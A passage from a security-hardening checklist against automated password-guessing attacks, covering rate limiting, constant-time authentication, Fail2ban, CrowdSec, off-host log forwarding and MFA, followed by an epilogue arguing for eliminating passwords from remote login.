- [ ] **15. IP & Route Rate Limiting**: Nginx `limit_req` zones enforced on `/login` and `/api/v1/auth` (e.g., 5 req/minute).
- [ ] **16. Constant-Time Authentication**: Backend code executes dummy cryptographic hashing when user records do not exist to eliminate timing enumeration.

### Observability, Threat Intelligence & Response
- [ ] **17. Dynamic Kernel Packet Dropping**: Fail2ban active with `nftables-multiport` jail configurations.
- [ ] **18. Collaborative Bot Banning**: CrowdSec deployed to preemptively ban globally recognized scanning botnets.
- [ ] **19. Real-Time Telemetry Forwarding**: `/var/log/auth.log` streamed over mTLS to an off-host SIEM (Vector / Rsyslog).
- [ ] **20. Mandatory Multi-Factor Authentication**: FIDO2 WebAuthn or TOTP enforced across all administrative and corporate identities.

---

## Epilogue: The Asymmetry of Modern Authentication

Automated dictionary attacks demonstrate the profound **asymmetry of cybersecurity**:
* A defender must secure every port, daemon, API endpoint, and hashed database record across thousands of servers, 24 hours a day, 365 days a year.
* An attacker only needs one unhardened service, one weak user password, or one exfiltrated `/etc/shadow` file to bring down the entire castle.

The solution is not to ask users to invent more complex passwords that they will inevitably write down on sticky notes or mutate predictably with an exclamation mark at the end. 

The solution is **architectural elimination**: strip passwords out of your remote attack surface, place management daemons behind zero-trust network boundaries, enforce hardware-backed cryptographic keys, and ensure that any hash stored at rest requires an insurmountable memory penalty to compute.

When the endpoint ceases to accept passwords, the wordlist ceases to be a weapon.

